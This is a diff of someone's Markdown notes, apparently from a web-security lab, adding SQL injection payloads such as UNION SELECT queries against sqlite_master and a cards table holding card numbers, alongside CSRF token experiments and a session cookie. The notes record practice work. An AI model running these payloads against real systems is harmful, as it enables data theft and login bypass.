@@ -220,6 +220,34 @@ session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIk1lc3NhZ2Ugc2VudC4iXX1dfQ.ah8o6
 
 
 csrf_token=cb1745f79417a77bfd308b6f15aeb3ef82a3f26a5a224404ebbb60790fe5302e
+
+![[Pasted image 20260604143934.png]]
+
+![[Pasted image 20260604144017.png]]
+
+UNION SELECT 1,sql,3 FROM sqlite_master--
+
+![[Pasted image 20260604144731.png]]
+
+![[Pasted image 20260604144939.png]]
+
+![[Pasted image 20260604144958.png]]
+
+after=1778005670 UNION SELECT 1,sql,3 FROM sqlite_master--
+
+Values that I know card_id 
+**card_name**
+
+UNION SELECT card_id,2,3 FROM cards--
+
+![[Pasted image 20260604145829.png]]
+
+## Constructing the sql injection 
+
+UNION SELECT card_id INTEGER PRIMARY KEY, user_id INTEGER, card_name TEXT, card_no TEXT, FROM cards--
+
+The CREATE TABLE statement is the **schema definition**, not the column names to put in your SELECT
+
 ### CSRF Token manipulation 
 
 I tried removing the CSRF token thing it gives this. 
@@ -231,6 +259,14 @@ The CSRF token that i see here in the response is different
 1efe2104df01ab7f43b1ebc24c58089e81046eecf147e45799505bfe254da520
 
 ![[Pasted image 20260601150405.png]]
+
+## Messages part 
+
+
+![[Pasted image 20260604142602.png]]
+
+UNION SELECT 1,2,3 FROM sqlite_master--
+
 
 ## SQL injection to login to bob. 
 
